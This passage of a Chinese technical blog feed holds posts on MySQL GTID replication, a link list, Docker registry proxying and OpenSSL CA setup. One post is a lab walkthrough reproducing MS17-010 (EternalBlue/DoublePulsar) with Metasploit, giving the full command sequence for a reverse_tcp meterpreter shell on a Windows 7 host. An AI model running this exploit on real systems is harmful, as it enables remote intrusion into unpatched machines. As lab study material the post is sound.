root@localhost [(none)] &gt; start slave;</div><div class="line">	Query OK, 0 rows affected (0.01 sec)</div><div class="line">	</div><div class="line">   root@localhost [(none)] &gt; show slave status\G;</div><div class="line">*************************** 1. row ***************************</div><div class="line">               Slave_IO_State: Waiting for master to send event</div><div class="line">                  Master_Host: 192.168.1.105</div><div class="line">                  Master_User: repl</div><div class="line">                  Master_Port: 3306</div><div class="line">                Connect_Retry: 60</div><div class="line">              Master_Log_File: mysql-bin.000001</div><div class="line">          Read_Master_Log_Pos: 154</div><div class="line">               Relay_Log_File: localhost-relay-bin.000003</div><div class="line">                Relay_Log_Pos: 367</div><div class="line">        Relay_Master_Log_File: mysql-bin.000001</div><div class="line">             Slave_IO_Running: Yes</div><div class="line">            Slave_SQL_Running: Yes</div><div class="line">              Replicate_Do_DB: </div><div class="line">          Replicate_Ignore_DB: </div><div class="line">           Replicate_Do_Table: </div><div class="line">       Replicate_Ignore_Table: </div><div class="line">      Replicate_Wild_Do_Table: </div><div class="line">  Replicate_Wild_Ignore_Table: </div><div class="line">                   Last_Errno: 0</div><div class="line">                   Last_Error: </div><div class="line">                 Skip_Counter: 0</div><div class="line">          Exec_Master_Log_Pos: 154</div><div class="line">              Relay_Log_Space: 791</div><div class="line">              Until_Condition: None</div><div class="line">               Until_Log_File: </div><div class="line">                Until_Log_Pos: 0</div><div class="line">           Master_SSL_Allowed: No</div><div class="line">           Master_SSL_CA_File: </div><div class="line">           Master_SSL_CA_Path: </div><div class="line">              Master_SSL_Cert: </div><div class="line">            Master_SSL_Cipher: </div><div class="line">               Master_SSL_Key: </div><div class="line">        Seconds_Behind_Master: 0</div><div class="line">Master_SSL_Verify_Server_Cert: No</div><div class="line">                Last_IO_Errno: 0</div><div class="line">                Last_IO_Error: </div><div class="line">               Last_SQL_Errno: 0</div><div class="line">               Last_SQL_Error: </div><div class="line">  Replicate_Ignore_Server_Ids: </div><div class="line">             Master_Server_Id: 233</div><div class="line">                  Master_UUID: 3288e218-3ecc-11e7-8f0d-005056b2706f</div><div class="line">             Master_Info_File: mysql.slave_master_info</div><div class="line">                    SQL_Delay: 0</div><div class="line">          SQL_Remaining_Delay: NULL</div><div class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</div><div class="line">           Master_Retry_Count: 86400</div><div class="line">                  Master_Bind: </div><div class="line">      Last_IO_Error_Timestamp: </div><div class="line">     Last_SQL_Error_Timestamp: </div><div class="line">               Master_SSL_Crl: </div><div class="line">           Master_SSL_Crlpath: </div><div class="line">           Retrieved_Gtid_Set: </div><div class="line">            Executed_Gtid_Set: </div><div class="line">                Auto_Position: 1</div><div class="line">         Replicate_Rewrite_DB: </div><div class="line">                 Channel_Name: </div><div class="line">           Master_TLS_Version: </div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">ERROR: </div><div class="line">No query specified</div><div class="line">	</div><div class="line">5. 让master 恢复读写</div><div class="line">    mysql &gt; SET @@global.read_only = OFF;</div></pre></td></tr></table></figure>
</li>
<li><p>从备份中恢复&amp;搭建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">1. 备份</div><div class="line">   mysqldump xx 获取并且记录gtid_purged值</div><div class="line">   --使用mysqldump导出数据库</div><div class="line">   # mysqldump --all-databases --single-transaction --triggers --routines --events \</div><div class="line">     --host=localhost --port=3306 --user=user --password=password &gt;/tmp/alldb.sql        </div><div class="line">   --导出的文件中已经包含了GTID_PURGED的信息</div><div class="line">   # grep GTID_PURGED /tmp/alldb.sql   </div><div class="line">   SET @@GLOBAL.GTID_PURGED=&apos;78336cdc-8cfb-11e6-ba9f-000c29328504:1-38&apos;;   </div><div class="line">   or</div><div class="line">   冷备份 --获取并且记录gtid_executed值，这个就相当于mysqldump中得到的gtid_purged</div><div class="line">2. 在新服务器上reset master,导入备份</div><div class="line">   reset master; --清空gtid信息  </div><div class="line">   导入备份； --如果是逻辑导入，请设置sql_log_bin=off</div><div class="line">   set global gtid_purged=xx;</div><div class="line">   </div><div class="line">   mysql&gt;SET @@GLOBAL.GTID_PURGED=&apos;78336cdc-8cfb-11e6-ba9f-000c29328504:1-38&apos;;  </div><div class="line">3. change master</div><div class="line">	mysql&gt; change master to</div><div class="line">           master_host=host,</div><div class="line">           master_port=port,</div><div class="line">           master_user=username,</div><div class="line">           master_password=password,</div><div class="line">           master_auto_position=1;</div><div class="line">    mysql&gt; start slave;</div><div class="line">	</div><div class="line">   root@localhost [(none)] &gt; CHANGE MASTER TO  MASTER_HOST=&apos;192.168.1.105&apos;,MASTER_PORT=3306,MASTER_USER=&apos;repl&apos;,MASTER_PASSWORD=&apos;repl_123456&apos;,MASTER_AUTO_POSITION=1;</div><div class="line">	Query OK, 0 rows affected, 2 warnings (0.16 sec)</div><div class="line">   root@localhost [(none)] &gt; start slave;</div><div class="line">	Query OK, 0 rows affected (0.01 sec)</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="GTID-运维和错误处理"><a href="#GTID-运维和错误处理" class="headerlink" title="GTID 运维和错误处理"></a><b>GTID 运维和错误处理</b></h5><ul>
<li>错误场景: Errant transaction<br>原因: </li>
</ul>
<ol>
<li>复制参数没有配置正确，当slave crash后，会出现重复键问题</li>
<li><p>DBA操作不正确，不小心在slave上执行了事务<br>传统模式下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">* skip transation; </div><div class="line">mysql&gt; SET GLOBAL SQL_SLAVE_SKIP_COUNTER=1;</div><div class="line">mysql&gt; START SLAVE;</div></pre></td></tr></table></figure>
<p> GTID模式下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SET GTID_NEXT=&apos;b9b4712a-df64-11e3-b391-60672090eb04:7&apos;;   --设置需要跳过的gtid event</div><div class="line">mysql&gt; BEGIN;COMMIT;</div><div class="line">mysql&gt; SET GTID_NEXT=&apos;AUTOMATIC&apos;;</div><div class="line">mysql&gt; START SLAVE;</div><div class="line"></div><div class="line">其中gtid_next就是跳过某个执行事务，设置gtid_next的方法一次只能跳过一个事务，要批量的跳过事务可以通过设置gtid_purged完成</div><div class="line">mysql&gt; reset master;</div><div class="line">mysql&gt; set global gtid_purged=&apos;b9b4712a-df64-11e3-b391-60672090eb04:1-7,b9b4712a-df64-11e3-b391-60672090eb05:6&apos;;</div><div class="line">mysql&gt; show master status;</div><div class="line"></div><div class="line">此时从库的Executed_Gtid_Set已经包含了主库上&apos;1-7&apos;和&apos;6&apos;的事务，再开启复制会从后面的事务开始执行，就不会出错了。注意，使用gtid_next和gtid_purged修复复制错误的前提是，跳过那些事务后仍可以确保主备数据一致。如果做不到，就要考虑pt-table-sync或者拉备份的方式了</div></pre></td></tr></table></figure>
<p> 无论是否启用GTID，使用pt-slave-restart工具:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#忽略所有1062错误，并再次启动SLAVE进程</div><div class="line">pt-slave-resetart -S./mysql.sock —error-numbers=1062</div></pre></td></tr></table></figure>
<p> 备注: 当发生inject empty transction后，有可能会丢失事务<br>当slave上inject empty transction，说明有一个master的事务被忽略了（这里假设是 $uuid:100）<br>事务丢失一：如果此时此刻master挂了，这个slave被选举为新master，那么其他的slave如果还没有执行到$uuid:100,就会丢失掉$uuid:100这个事务<br>事务丢失二：如果从备份中重新搭建一个slave，需要重新执行之前的所有事务，而此时，master挂了， 又回到了事务丢失一的场景</p>
<p> mysqldump时GTID参数<br>[root@localhost ~]# /usr/local/whistle/mysql/bin/mysqldump –help|grep gtid-purged -A8<br>–set-gtid-purged[=name] </p>
<pre><code>Add &apos;SET @@GLOBAL.GTID_PURGED&apos; to the output. Possible
values for this option are ON, OFF and AUTO. If ON is
used and GTIDs are not enabled on the server, an error is
generated. If OFF is used, this option does nothing. If
AUTO is used and GTIDs are enabled on the server, &apos;SET
@@GLOBAL.GTID_PURGED&apos; is added to the output. If GTIDs
are disabled, AUTO does nothing. If no value is supplied
then the default (AUTO) value will be considered.
</code></pre></li>
</ol>
<p>ref</p>
<p><a href="http://keithlan.github.io/2016/06/23/gtid/" target="_blank" rel="external">MySQL5.7杀手级新特性：GTID原理与实战</a><br><a href="http://www.ywnds.com/?p=3898" target="_blank" rel="external">MySQL基于GTID的复制实现详解</a><br><a href="http://www.cnblogs.com/zhoujinyi/p/5704567.html" target="_blank" rel="external">MySQL 5.7 Replication 相关新功能说明</a><br><a href="http://blog.csdn.net/cug_jiang126com/article/details/54095181" target="_blank" rel="external">5.6mysqldump gtid的一个小坑</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;测试介绍: 一主一从&lt;br&gt;运行环境:&lt;br&gt;centos7.3、mysql5.7.17&lt;/p&gt;
&lt;h5 id=&quot;理论准备&quot;&gt;&lt;a href=&quot;#理论准备&quot; class=&quot;headerlink&quot; title=&quot;理论准备&quot;&gt;&lt;/a&gt;&lt;b&gt;理论准备&lt;/b&gt;&lt;/h5&gt;&lt;ul&gt;
&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>有趣的网址-不断更新中</title>
    <link href="https://t1ger.github.io/2017/05/19/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E5%9D%80-%E4%B8%8D%E6%96%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
    <id>https://t1ger.github.io/2017/05/19/有趣的网址-不断更新中/</id>
    <published>2017-05-19T03:23:05.000Z</published>
    <updated>2017-05-23T02:03:37.235Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>全球多节点域名解析查询<br><a href="https://www.whatsmydns.net" target="_blank" rel="external">https://www.whatsmydns.net</a></p>
</li>
<li><p>玩游戏,赚比特币<br><a href="http://bitcoin2048.com/?r=321516" target="_blank" rel="external">http://bitcoin2048.com</a></p>
</li>
<li><p>网站响应速度检测<br><a href="http://ping.chinaz.com" target="_blank" rel="external">http://ping.chinaz.com</a></p>
</li>
<li><p>简单快速地从全球多点PING您的网站或服务器<br><a href="http://www.super-ping.com" target="_blank" rel="external">http://www.super-ping.com</a></p>
</li>
<li><p>一个给网站打分的网站<br><a href="https://gtmetrix.com" target="_blank" rel="external">https://gtmetrix.com/</a></p>
</li>
<li><p>A tool for easy online testing and sharing of database problems and their solutions<br><a href="http://sqlfiddle.com/" target="_blank" rel="external">http://sqlfiddle.com/</a></p>
</li>
<li><p>微软IE虚拟机下载<br><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="external">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></p>
</li>
<li><p>原型设计及协作工具<br><a href="https://modao.cc" target="_blank" rel="external">https://modao.cc</a></p>
</li>
<li><p>人人可用的在线问卷调查<br><a href="https://jinshuju.net/" target="_blank" rel="external">https://jinshuju.net/</a></p>
</li>
<li><p>pdf转word<br><a href="http://pdf2doc.com/zh/" target="_blank" rel="external">http://pdf2doc.com/zh/</a></p>
</li>
<li><p>Easy Firewall Generator for IPTables<br><a href="http://slogra.com/" target="_blank" rel="external">http://slogra.com/</a></p>
</li>
<li><p>SSL For Free<br><a href="https://www.sslforfree.com" target="_blank" rel="external">https://www.sslforfree.com/</a></p>
</li>
<li><p>电脑操作系统界面大全-GUI Gallery<br><a href="http://toastytech.com/guis/" target="_blank" rel="external">http://toastytech.com/guis/</a></p>
</li>
<li><p>在线模拟各种系统升级-Fakeupdate<br><a href="http://fakeupdate.net/" target="_blank" rel="external">http://fakeupdate.net/</a><br>进入网站后，点击右边的模板即可开始，按F11全屏显示，按回车键出现错误出画</p>
</li>
<li><p>一个免费的10G俄罗斯网盘<br><a href="https://yandex.com/" target="_blank" rel="external">https://yandex.com/</a></p>
</li>
<li><p>快速搭建远程同步画面-frop.io<br><a href="https://frop.io/" target="_blank" rel="external">https://frop.io/</a><br>进入网站后，由一方生成链接，发给另一方访问，这时，就可以将要展示的文件拖动到网页中发送了</p>
</li>
<li><p>线免费的前端黑工具<br><a href="http://xssor.io" target="_blank" rel="external">http://xssor.io</a></p>
</li>
</ul>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;全球多节点域名解析查询&lt;br&gt;&lt;a href=&quot;https://www.whatsmydns.net&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.whatsmydns.net&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>方程式-ms17-010复现</title>
    <link href="https://t1ger.github.io/2017/05/16/%E6%96%B9%E7%A8%8B%E5%BC%8F-ms17-010%E5%A4%8D%E7%8E%B0/"/>
    <id>https://t1ger.github.io/2017/05/16/方程式-ms17-010复现/</id>
    <published>2017-05-16T14:28:33.000Z</published>
    <updated>2017-05-16T14:01:15.340Z</updated>
    
    <content type="html"><![CDATA[<p>0x01 环境介绍:</p>
<p>目标机win7 x86: 192.168.1.120</p>
<p>控制机Kail: 192.168.1.99</p>
<p>0x02 环境准备</p>
<p>利用模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>wine可以在linux下运行windows程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install wine </div><div class="line">wine cmd.exe  打开cmd.exe,exit退出</div></pre></td></tr></table></figure></p>
<p>将链接的文件克隆到kali中，并将eternalblue_doublepulsar.rb移动至metasploit的exploit/windows/smb文件夹中,具体路径为/usr/share/metasploit-framework/modules/exploits/windows/smb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</div><div class="line">cp Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</div></pre></td></tr></table></figure></p>
<p>0x03 利用过程</p>
<p>设置参数，按照实际情况设置，DOUBLEPULSARPATH和ETERNALBLUEPATH指向从github下载的deps文件夹即可，里面包含了DOUBLEPULSAR和ETERNALBLUE所需的dll<br>设置一个payload<br>注意：如果靶机为64位，改为set payload windows/x64/meterpreter/reverse_tcp</p>
<p>然后打开msfconsole<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">use exploit/windows/smb/eternalblue_doublepulsar</div><div class="line">#set   DOUBLEPULSARPATH  /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">#set  ETERNALBLUEPATH   /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">set processinject lsass.exe</div><div class="line">#set TARGETARCHITECTURE  x64</div><div class="line">set rhost 192.168.1.120</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.99</div><div class="line">show targess </div><div class="line">set target 9</div><div class="line">options </div><div class="line">run</div></pre></td></tr></table></figure></p>
<p>最后在msf下可以看到成功反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;sysinfo</div><div class="line">meterpreter&gt;shell</div></pre></td></tr></table></figure></p>
<p>ref<br><a href="http://www.cnblogs.com/backlion/p/6804863.html" target="_blank" rel="external">smb(ms17-010)远程命令执行之msf</a><br><a href="http://www.jianshu.com/p/ceb184b3dbc3" target="_blank" rel="external">ms17-010</a><br><a href="http://mt.sohu.com/20170505/n491866402.shtml" target="_blank" rel="external">方程式利用-不需Fuzzbunch完美入侵windows</a><br><a href="https://www.t00ls.net/articles-39343.html" target="_blank" rel="external">方程式ETERNALBLUE 之fb.py的复现</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 环境介绍:&lt;/p&gt;
&lt;p&gt;目标机win7 x86: 192.168.1.120&lt;/p&gt;
&lt;p&gt;控制机Kail: 192.168.1.99&lt;/p&gt;
&lt;p&gt;0x02 环境准备&lt;/p&gt;
&lt;p&gt;利用模块：&lt;a href=&quot;https://github.com/Eleven
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker私有registry配置nginx反向代理</title>
    <link href="https://t1ger.github.io/2017/04/25/docker%E7%A7%81%E6%9C%89registry%E9%85%8D%E7%BD%AEnginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <id>https://t1ger.github.io/2017/04/25/docker私有registry配置nginx反向代理/</id>
    <published>2017-04-25T12:11:13.000Z</published>
    <updated>2017-04-25T11:56:38.779Z</updated>
    
    <content type="html"><![CDATA[<h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a><b>准备工作</b></h5><p>生成证书，注意要和使用域名一致</p>
<h5 id="Registry的部署"><a href="#Registry的部署" class="headerlink" title="Registry的部署"></a><b>Registry的部署</b></h5><ul>
<li><p>获取镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">docker search registry</div><div class="line">docker pull registry</div><div class="line">#如果无法获取 添加镜像 </div><div class="line">/usr/bin/dockerd --registry-mirror=https://docker.mirrors.ustc.edu.cn</div></pre></td></tr></table></figure>
</li>
<li><p>启动一个容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#registry证书和nginx使用一致</div><div class="line">docker run -d -v /opt/registry:/var/lib/registry -p 5000:5000 -v /usr/local/nginx/conf:/certs -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/registry.top.com.cn.crt -e REGISTRY_HTTP_TLS_KEY=/certs/registry.top.com.cn.key --restart=always --name registry registry</div></pre></td></tr></table></figure>
<p>  在浏览器中访问 <a href="http://192.168.1.106:5000/v2" target="_blank" rel="external">http://192.168.1.106:5000/v2</a> 看页面是否正常</p>
</li>
<li><p>进行nginx配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">upstream my_docker_registry  &#123;</div><div class="line">    server 192.168.1.106:5000; # </div><div class="line">&#125;</div><div class="line"></div><div class="line">## START registry.top.com.cn ##</div><div class="line">server &#123;</div><div class="line">    server_name registry.top.com.cn;</div><div class="line"></div><div class="line">    listen 80;</div><div class="line">    listen 443 ssl;</div><div class="line"></div><div class="line">    # 使用私有registry的ssl证书</div><div class="line">    ssl_certificate /usr/local/nginx/conf/registry.top.com.cn.crt;</div><div class="line">    ssl_certificate_key /usr/local/nginx/conf/registry.top.com.cn.key;</div><div class="line">    access_log logs/registry.access.log main;</div><div class="line">    error_log  logs/registry.error.log;</div><div class="line"></div><div class="line">    root        /usr/local/webapps;</div><div class="line">    index       index.html;</div><div class="line">    client_max_body_size 0; # disable any limits to avoid HTTP 413 for large image uploads</div><div class="line"></div><div class="line">    # required to avoid HTTP 411: see Issue #1486 (https://github.com/docker/docker/issues/1486)</div><div class="line">    chunked_transfer_encoding on;</div><div class="line"></div><div class="line">    add_header &apos;Docker-Distribution-Api-Version&apos; &apos;registry/2.0&apos; always;</div><div class="line">    location / &#123;</div><div class="line">        proxy_pass  https://my_docker_registry;</div><div class="line">        proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;</div><div class="line">        proxy_redirect off;</div><div class="line">        proxy_buffering off;</div><div class="line">        proxy_set_header        Host            $host;</div><div class="line">        proxy_set_header        X-Real-IP       $remote_addr;</div><div class="line">        proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;</div><div class="line">        proxy_set_header Docker-Distribution-Api-Version registry/2.0;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a><b>验证</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">docker pull hello-world</div><div class="line">docker tag hello-world registry.top.com.cn/hello-world</div><div class="line">docker push registry.top.com.cn/hello-world</div><div class="line"></div><div class="line">#因为我们启动的registry服务不是安全可信赖的，需要</div><div class="line">添加 /usr/bin/dockerd --insecure-registry=registry.top.com.cn </div><div class="line">systemctl daemon-reload</div><div class="line">systemctl restart docker</div><div class="line"></div><div class="line">再次执行docker push registry.top.com.cn/hello-world</div></pre></td></tr></table></figure>
<p>在浏览器中访问 <a href="http://registry.top.com.cn/v2/_catalog" target="_blank" rel="external">http://registry.top.com.cn/v2/_catalog</a> ,应该会看到<br>{“repositories”:[“hello-world”]}</p>
<p>ref<br><a href="http://blog.csdn.net/renhuailin/article/details/50461651" target="_blank" rel="external">为docker私有registry配置nginx反向代理</a><br><a href="https://github.com/moby/moby/issues/8849" target="_blank" rel="external">access private registry: x509</a><br><a href="http://www.cnblogs.com/lienhua34/p/4922130.html" target="_blank" rel="external">Docker私有仓库Registry的搭建验证</a><br><a href="http://unixman.blog.51cto.com/10163040/1707423" target="_blank" rel="external">Docker Registry V2(distribution) &amp; Proxy(nginx) 的搭建经历</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;&lt;b&gt;准备工作&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;生成证书，注意要和使用域名一致&lt;/p&gt;
&lt;h5 id=&quot;Registry的部署&quot;&gt;&lt;a href=&quot;#Regi
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何生成自签名证书</title>
    <link href="https://t1ger.github.io/2017/04/13/%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/"/>
    <id>https://t1ger.github.io/2017/04/13/如何生成自签名证书/</id>
    <published>2017-04-13T08:52:09.000Z</published>
    <updated>2017-04-18T01:46:12.947Z</updated>
    
    <content type="html"><![CDATA[<h5 id="make-work-dir"><a href="#make-work-dir" class="headerlink" title="make work dir"></a><b>make work dir</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cd /etc/pki/CA/ &amp;&amp; umask 0077 &amp;&amp; mkdir -p /etc/pki/CA/&#123;private,certs,crl,csr,newcerts,private&#125; &amp;&amp; touch index.txt &amp;&amp; echo &apos;00&apos;&gt;serial</div></pre></td></tr></table></figure>
<h5 id="config-file-etc-pki-CA-openssl-conf"><a href="#config-file-etc-pki-CA-openssl-conf" class="headerlink" title="config file /etc/pki/CA/openssl.conf"></a><b>config file /etc/pki/CA/openssl.conf</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div></pre></td><td class="code"><pre><div class="line">HOME            = .</div><div class="line">RANDFILE        = $ENV::HOME/.rnd</div><div class="line">oid_section     = new_oids</div><div class="line">[ new_oids ]</div><div class="line">tsa_policy1 = 1.2.3.4.1</div><div class="line">tsa_policy2 = 1.2.3.4.5.6</div><div class="line">tsa_policy3 = 1.2.3.4.5.7</div><div class="line">[ ca ]</div><div class="line">default_ca  = CA_default        # The default ca section</div><div class="line">[ CA_default ]</div><div class="line">dir     = /etc/pki/CA       # Where everything is kept</div><div class="line">certs       = $dir/certs        # Where the issued certs are kept</div><div class="line">crl_dir     = $dir/crl      # Where the issued crl are kept</div><div class="line">database    = $dir/index.txt    # database index file.</div><div class="line">                   # several ctificates with same subject.</div><div class="line">new_certs_dir   = $dir/newcerts     # default place for new certs.</div><div class="line">certificate = $dir/certs/ca.crt     # The CA certificate</div><div class="line">serial      = $dir/serial       # The current serial number</div><div class="line">crlnumber   = $dir/crlnumber    # the current crl number</div><div class="line">                   # must be commented out to leave a V1 CRL</div><div class="line">crl     = $dir/crl/crl.pem      # The current CRL</div><div class="line">private_key = $dir/private/ca.key   # The private key</div><div class="line">RANDFILE    = $dir/private/.rand    # private random number file</div><div class="line">x509_extensions = usr_cert      # The extentions to add to the cert</div><div class="line">name_opt    = ca_default        # Subject Name options</div><div class="line">cert_opt    = ca_default        # Certificate field options</div><div class="line">default_days    = 3650          # how long to 